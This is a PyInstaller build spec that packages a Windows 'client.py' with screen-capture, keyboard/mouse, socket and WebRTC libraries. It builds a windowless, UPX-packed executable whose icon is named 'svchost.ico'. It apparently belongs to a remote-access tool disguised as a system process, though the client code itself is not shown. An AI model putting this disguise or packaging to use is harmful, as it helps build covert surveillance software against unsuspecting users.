# -*- mode: python ; coding: utf-8 -*-

import os
import sys
from PyInstaller.utils.hooks import collect_submodules, collect_data_files

block_cipher = None

# ────────────────────────────────────────────────
#  COLLECT HIDDEN IMPORTS & DATA FILES AUTOMATICALLY
# ────────────────────────────────────────────────

hiddenimports = [
    # Core asyncio / networking
    'asyncio',
    'socketio',
    'socketio.client',
    'engineio',
    'engineio.client',
    'engineio.async_drivers.eventlet',
    'eventlet',
    'eventlet.hubs',
    'eventlet.green',
    'eventlet.queue',
    'eventlet.greenio',
    'eventlet.semaphore',
    'eventlet.timeout',
    'socketio.async_drivers.eventlet',

    # Screen capture & image processing
    'mss',
    'dxcam',
    'numpy',
    'numpy.core._multiarray_umath',
    'numpy.lib.format',
    'cv2',                      # very important
    'PIL', 'PIL.Image',         # sometimes pulled in indirectly

    # Windows-specific
    'win32api',
    'win32con',
    'win32event',
    'win32file',
    'win32gui',
    'win32process',
    'win32security',
    'win32timezone',
    'winreg',
    'ctypes',
    'ctypes.wintypes',
    'pythoncom',
    'win32com',
    'win32com.client',
    'pywintypes',

    # Input / mouse / keyboard
    'pynput',
    'pynput.keyboard',
    'pynput.keyboard._win32',
    'pynput.mouse',
    'pynput.mouse._win32',

    # Others frequently missed
    'psutil',
    'multiprocessing',
    'multiprocessing.context',
    'multiprocessing.dummy',
    'queue',
    'base64',
    'logging',
    'logging.handlers',
    'fractions',
    'gc',
    'tempfile',
    'platform',
    'atexit',
    'signal',
    'threading',
    'warnings',
    'traceback',
    'io',
    'zlib',
    'requests',
    
    # WebRTC / media (optional but supported)
    'av',
    'aiortc',
    'aiortc.contrib',
    'aiortc.contrib.signaling',
    'aioice',
    'pylibsrtp',
    'dns.rdtypes.ANY',
    'dns.rdtypes.IN',
    'dns.rdtypes.IN.A',
]

hiddenimports += collect_submodules('mss')
# Collect extra data files that some libraries need
datas = []
datas += collect_data_files('cv2')             # OpenCV data / haarcascades / etc
datas += collect_data_files('mss')             # sometimes helps
datas += collect_data_files('dxcam')           # important for dxcam
datas += collect_data_files('numpy')           # .dll & .pyd files
datas += collect_data_files('pynput')
datas += collect_data_files('pygame')          # pygame base assets and binaries
datas += collect_data_files('turbojpeg')       # turbojpeg.dll from PyTurboJPEG
datas += collect_data_files('av')              # PyAV binary extensions
datas += collect_data_files('pylibsrtp')       # SRTP runtime libraries

# If you have any custom .dll, .so, .pyd you manually placed → add them here
# binaries += [('path/to/some.dll', '.')] 

a = Analysis(
    ['client.py'],
    pathex=[os.path.abspath('.')],
    binaries=[],
    datas=datas,
    hiddenimports=hiddenimports,
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[
        'tkinter', 'Tkinter',
        'PyQt5', 'PyQt6', 'PySide2', 'PySide6',
        'matplotlib', 'pandas', 'scipy', 'torch', 'tensorflow',
        'IPython', 'jupyter'
    ],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
    optimize=0,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,        # Moved from COLLECT to here
    a.zipfiles,        # Moved from COLLECT to here
    a.datas,           # Moved from COLLECT to here
    [],
    name='client',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=['vcruntime140.dll', 'msvcp140.dll', 'cv2*.pyd'],
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon='svchost.ico', # Make sure this file is in the same folder!
)

# DELETE or COMMENT OUT the 'coll = COLLECT(...)' section at the bottom.
# You don't need it for a single EXE build.
